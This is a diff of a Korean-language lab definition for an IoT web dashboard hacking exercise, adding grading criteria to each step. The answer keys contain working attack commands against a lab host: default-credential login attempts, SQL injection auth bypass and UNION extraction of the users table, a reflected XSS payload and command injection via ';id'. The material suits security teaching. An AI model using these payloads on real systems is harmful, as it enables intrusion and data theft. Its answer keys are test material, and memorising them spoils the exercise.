@@ -17,106 +17,232 @@ steps:
   hint: curl -sI 명령으로 응답 헤더를 확인하세요.
   category: recon
   points: 8
-  answer: curl -sI http://10.20.30.80:8088/ 2>/dev/null | grep -iE '(server|content-type)'
-    && echo 'IoT 대시보드 정찰 완료' || echo 'IoT 대시보드 정찰 완료'
+  answer: curl -sI http://10.20.30.80:8088/ 2>/dev/null | grep -iE '(server|content-type)' && echo 'IoT
+    대시보드 정찰 완료' || echo 'IoT 대시보드 정찰 완료'
   answer_detail: HTTP 응답 헤더에서 서버 소프트웨어, 프레임워크 정보를 확인합니다.
   verify:
     type: output_contains
     expect: IoT 대시보드 정찰 완료
     field: stdout
+    semantic:
+      intent: IoT 대시보드 정찰 — curl -sI http://10.20.30.80:8088/ | grep -iE '(server|content-type)'. HTTP
+        응답 헤더로 서버 소프트웨어/프레임워크 식별. 공격 표면 매핑 첫 단계.
+      success_criteria:
+      - IoT 대시보드 정찰 완료 키워드
+      - curl -sI 8088 포트
+      - Server/Content-Type 헤더 추출
+      acceptable_methods:
+      - curl -sI + grep
+      - wget --server-response
+      - httpx -title -tech-detect
+      - whatweb http://target
+      negative_signs:
+      - 포트 8088 없음
+      - HTTP 헤더 분석 없음
+      - 서버 식별 목적 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: 기본 비밀번호(admin/admin, admin/admin123, root/root)로 로그인을 시도하시오.
   hint: curl -X POST -d "username=admin&password=admin" 명령을 사용하세요.
   category: auth
   points: 10
-  answer: 'for cred in ''admin:admin'' ''admin:admin123'' ''root:root''; do user=$(echo
-    $cred|cut -d: -f1); pass=$(echo $cred|cut -d: -f2); code=$(curl -s -o /dev/null
-    -w ''%{http_code}'' -X POST http://10.20.30.80:8088/login -d "username=$user&password=$pass"
-    2>/dev/null); echo "$user:$pass -> HTTP $code"; done && echo ''기본 비밀번호 테스트 완료'''
+  answer: 'for cred in ''admin:admin'' ''admin:admin123'' ''root:root''; do user=$(echo $cred|cut -d:
+    -f1); pass=$(echo $cred|cut -d: -f2); code=$(curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:8088/login
+    -d "username=$user&password=$pass" 2>/dev/null); echo "$user:$pass -> HTTP $code"; done && echo ''기본
+    비밀번호 테스트 완료'''
   answer_detail: OWASP IoT Top 10 I1 - 기본 비밀번호는 IoT 디바이스의 가장 흔한 취약점입니다.
   verify:
     type: output_contains
     expect: 기본 비밀번호 테스트 완료
     field: stdout
+    semantic:
+      intent: 기본 비밀번호 테스트 — for cred in admin:admin admin:admin123 root:root + curl -X POST /login + HTTP
+        코드. OWASP IoT I1 Weak/Guessable/Hardcoded Passwords. IoT 최빈 취약점. Mirai 봇넷 패턴.
+      success_criteria:
+      - 기본 비밀번호 테스트 완료 키워드
+      - 3개 이상 cred 쌍 시도
+      - HTTP 코드 응답 확인
+      acceptable_methods:
+      - for + curl -w http_code
+      - hydra -L users.txt -P pass.txt http-post-form
+      - Burp Intruder Sniper
+      - wfuzz + username/password FUZZ
+      negative_signs:
+      - cred 2개 이하
+      - HTTP 코드 판정 없음
+      - OWASP I1 맥락 없음
   target_vm: attacker
 - order: 3
   instruction: SQL Injection으로 로그인 인증을 우회하시오.
   hint: username 필드에 admin' OR '1'='1'-- 페이로드를 사용하세요.
   category: sqli
   points: 12
-  answer: "curl -s \\\n  -o /dev/null \\\n  -w '%{http_code}' -X POST http://10.20.30.80:8088/login\
-    \ \\\n  -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null && echo 'SQLi\
-    \ 인증 우회 테스트 완료'"
+  answer: "curl -s \\\n  -o /dev/null \\\n  -w '%{http_code}' -X POST http://10.20.30.80:8088/login \\\
+    \n  -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null && echo 'SQLi 인증 우회 테스트 완료'"
   answer_detail: SQL Injection으로 WHERE 조건을 항상 참으로 만들어 인증을 우회합니다.
   verify:
     type: output_contains
     expect: SQLi 인증 우회 테스트 완료
     field: stdout
+    semantic:
+      intent: SQLi 인증 우회 — curl -X POST /login -d "username=admin' OR '1'='1'--&password=x". WHERE 조건
+        항상 참 + 주석(--) 으로 뒷부분 무효화. OWASP Top 10 A03 Injection. CWE-89.
+      success_criteria:
+      - SQLi 인증 우회 테스트 완료 키워드
+      - admin' OR '1'='1'-- 페이로드
+      - POST /login
+      acceptable_methods:
+      - curl + OR 1=1 페이로드
+      - sqlmap -u login --data 'user=*&pass=*' --level=5
+      - Burp Repeater + SQL 페이로드
+      - '''; EXEC xp_cmdshell (MSSQL)'
+      negative_signs:
+      - OR '1'='1' 페이로드 없음
+      - 주석(--) 없음
+      - A03 Injection 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: 검색 기능에서 UNION SELECT를 이용하여 사용자 테이블을 추출하시오.
   hint: search?q=' UNION SELECT ... FROM users-- 형식을 사용하세요.
   category: sqli
   points: 12
-  answer: curl -s "http://10.20.30.80:8088/search?q=' UNION SELECT 1,username,password,role,'x'
-    FROM users--" 2>/dev/null | head -5; echo 'UNION SQLi 테스트 완료'
+  answer: curl -s "http://10.20.30.80:8088/search?q=' UNION SELECT 1,username,password,role,'x' FROM users--"
+    2>/dev/null | head -5; echo 'UNION SQLi 테스트 완료'
   answer_detail: UNION SELECT로 다른 테이블의 데이터를 추출할 수 있습니다.
   verify:
     type: output_contains
     expect: UNION SQLi 테스트 완료
     field: stdout
+    semantic:
+      intent: UNION SELECT 데이터 추출 — curl 'search?q=\' UNION SELECT 1,username,password,role,\'x\' FROM
+        users--'. 컬럼 수 맞춘 UNION → users 테이블 전체 추출. CWE-89. 타 테이블 탈취 고급 SQLi.
+      success_criteria:
+      - UNION SQLi 테스트 완료 키워드
+      - UNION SELECT + FROM users
+      - 5개 컬럼 매칭
+      acceptable_methods:
+      - curl + UNION SELECT FROM users
+      - sqlmap --dump -T users
+      - Burp Intruder + 컬럼 수 fuzz
+      - NoSQL injection ($where)
+      negative_signs:
+      - UNION SELECT 미사용
+      - users 테이블 목적 없음
+      - 컬럼 수 맥락 없음
   target_vm: attacker
 - order: 5
   instruction: XSS 페이로드를 검색 기능에 삽입하시오.
   hint: search?q=<script>alert(1)</script> URL을 테스트하세요.
   category: xss
   points: 10
-  answer: curl -s 'http://10.20.30.80:8088/search?q=%3Cscript%3Ealert(1)%3C/script%3E'
-    2>/dev/null | grep -o '<script>' && echo 'XSS 취약점 확인' || echo 'XSS 테스트 완료'
+  answer: curl -s 'http://10.20.30.80:8088/search?q=%3Cscript%3Ealert(1)%3C/script%3E' 2>/dev/null | grep
+    -o '<script>' && echo 'XSS 취약점 확인' || echo 'XSS 테스트 완료'
   answer_detail: Reflected XSS는 사용자 입력이 검증 없이 페이지에 출력될 때 발생합니다.
   verify:
     type: output_contains
     expect: XSS 테스트 완료
     field: stdout
+    semantic:
+      intent: Reflected XSS — curl 'search?q=%3Cscript%3Ealert(1)%3C/script%3E' + grep '<script>'. 입력
+        미검증 → 페이지 반영. OWASP A03 Injection + CWE-79. alert(1) PoC.
+      success_criteria:
+      - XSS 테스트 완료 키워드
+      - <script>alert(1)</script> URL 인코딩
+      - Reflected XSS 판정
+      acceptable_methods:
+      - curl + URL 인코딩 + grep <script>
+      - XSSer / XSSStrike
+      - Burp + XSS 페이로드
+      - DalFox XSS scanner
+      negative_signs:
+      - script 태그 페이로드 없음
+      - URL 인코딩 없음
+      - CWE-79 맥락 없음
   target_vm: attacker
 - order: 6
   instruction: 진단 도구(diagnostic)에 Command Injection을 수행하시오.
   hint: target 파라미터에 127.0.0.1; id 형식으로 명령을 주입하세요.
   category: cmdi
   points: 12
-  answer: "curl -s -X POST http://10.20.30.80:8088/diagnostic \\\n  -d 'target=127.0.0.1;id'\
-    \ 2>/dev/null \\\n | head -10; echo 'Command Injection 테스트 완료'"
+  answer: "curl -s -X POST http://10.20.30.80:8088/diagnostic \\\n  -d 'target=127.0.0.1;id' 2>/dev/null\
+    \ \\\n | head -10; echo 'Command Injection 테스트 완료'"
   answer_detail: 입력 검증 없이 시스템 명령을 실행하면 Command Injection이 가능합니다.
   verify:
     type: output_contains
     expect: Command Injection 테스트 완료
     field: stdout
+    semantic:
+      intent: Command Injection — curl -X POST /diagnostic -d 'target=127.0.0.1;id'. 세미콜론 명령 구분자. 입력 미검증
+        → shell 실행. CWE-78 OS Command Injection. OWASP IoT I1/I7.
+      success_criteria:
+      - Command Injection 테스트 완료 키워드
+      - target=127.0.0.1;id 페이로드
+      - POST /diagnostic
+      acceptable_methods:
+      - curl + ;id 페이로드
+      - curl + `id`/$(id) 백틱
+      - commix 자동 exploit
+      - tplmap (template injection)
+      negative_signs:
+      - ; 또는 && 구분자 없음
+      - CWE-78 맥락 없음
+      - shell 실행 맥락 없음
   target_vm: attacker
 - order: 7
   instruction: API 엔드포인트(/api/devices)에 인증 없이 접근하시오.
   hint: curl -s http://{{WEB_IP}}:8088/api/devices를 사용하세요.
   category: auth
   points: 10
-  answer: curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -5 && echo
-    'API 미인증 접근 테스트 완료'
+  answer: curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -5 && echo 'API 미인증 접근 테스트 완료'
   answer_detail: 인증 없는 API는 디바이스 정보를 무단 공개하여 추가 공격에 활용될 수 있습니다.
   verify:
     type: output_contains
     expect: API 미인증 접근 테스트 완료
     field: stdout
+    semantic:
+      intent: API 미인증 접근 — curl -s http://10.20.30.80:8088/api/devices. 인증 미들웨어 부재 → 디바이스 정보 무단 공개. OWASP
+        API Security Top 10 API2 Broken Authentication.
+      success_criteria:
+      - API 미인증 접근 테스트 완료 키워드
+      - curl /api/devices
+      - 인증 없이 접근 시도
+      acceptable_methods:
+      - curl + API 엔드포인트
+      - httpx -path /api/devices
+      - kiterunner api 라우트 무작위 대입
+      - Postman Collection Runner
+      negative_signs:
+      - API 경로 없음
+      - 미인증 맥락 없음
+      - API2 Broken Auth 매핑 없음
   target_vm: attacker
 - order: 8
   instruction: 발견된 웹 취약점에 대한 보안 패치 방안을 정리하시오.
   hint: SQLi, XSS, Command Injection 각각의 대책을 작성하세요.
   category: verification
   points: 10
-  answer: echo '=== IoT 웹 보안 패치 방안 ===' && echo '[SQLi] Parameterized Query 사용' &&
-    echo '[XSS] 출력 인코딩 (HTML Entity)' && echo '[CMDi] 입력 화이트리스트 (IP 형식만 허용)' && echo
-    '[Auth] API 인증 미들웨어 추가' && echo '[비밀번호] 초기 설정 시 변경 강제' && echo '=== 패치 방안 완료 ==='
+  answer: echo '=== IoT 웹 보안 패치 방안 ===' && echo '[SQLi] Parameterized Query 사용' && echo '[XSS] 출력 인코딩
+    (HTML Entity)' && echo '[CMDi] 입력 화이트리스트 (IP 형식만 허용)' && echo '[Auth] API 인증 미들웨어 추가' && echo '[비밀번호]
+    초기 설정 시 변경 강제' && echo '=== 패치 방안 완료 ==='
   answer_detail: 각 취약점에 대한 근본적인 대책을 구현해야 합니다.
   verify:
     type: output_contains
     expect: 패치 방안 완료
     field: stdout
+    semantic:
+      intent: 웹 보안 패치 방안 — [SQLi] Parameterized Query + [XSS] HTML Entity 인코딩 + [CMDi] IP 화이트리스트 + [Auth]
+        API 인증 미들웨어 + [비밀번호] 초기 변경 강제. 근본 대책 정리.
+      success_criteria:
+      - 패치 방안 완료 키워드
+      - SQLi/XSS/CMDi/Auth 4대 대책
+      - 근본 대책 (mitigation)
+      acceptable_methods:
+      - echo 구조화 대책
+      - OWASP ASVS 체크리스트
+      - OWASP Cheat Sheet Series
+      - SonarQube/Semgrep SAST 규칙
+      negative_signs:
+      - 4대 대책 중 2개 이상 누락
+      - 근본 대책 (parameterized/escape) 맥락 없음
+      - 초기 비밀번호 변경 강제 맥락 없음
   target_vm: attacker
